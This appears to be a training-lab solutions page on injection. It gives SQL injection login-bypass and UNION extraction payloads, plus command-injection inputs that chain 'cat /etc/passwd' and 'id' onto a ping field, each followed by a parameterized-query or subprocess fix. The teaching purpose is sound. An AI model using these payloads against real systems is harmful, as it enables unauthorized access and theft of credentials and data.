# A05 – Injection: Solutions

## Challenge 1 – SQLi Auth Bypass
At `/a05/login`, enter:
- Username: `admin`
- Password: `' OR '1'='1`

Query becomes:
```sql
SELECT * FROM a05_users WHERE username = 'admin' AND password = '' OR '1'='1'
```
The `OR '1'='1'` is always true → returns first matching row (admin).

Alternative payloads:
- Username: `' OR 1=1--` / Password: `anything`
- Username: `admin'--` / Password: `anything`

**Fix:**
```python
user = db.execute(
    "SELECT * FROM a05_users WHERE username=? AND password=?",
    [username, password]
).fetchone()
```

## Challenge 2 – UNION Extraction
At `/a05/search`, enter:
```
' UNION SELECT id,username,password,role FROM a05_users--
```
This appends a second SELECT that returns all users (including admin's password `sup3r_s3cr3t`).

**Fix:** Parameterized queries + whitelist search fields.

## Challenge 3 – Command Injection
At `/a05/ping`, enter:
```
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; ls /home
```
The backend runs `ping -c 2 127.0.0.1; id` via `shell=True`.

**Fix:**
```python
import subprocess, shlex
# Never use shell=True with user input
proc = subprocess.run(
    ['ping', '-c', '2', host],  # list form, no shell
    capture_output=True, text=True, timeout=10
)
```
Also validate `host` against a strict regex: `^[a-zA-Z0-9.\-]{1,253}$`.
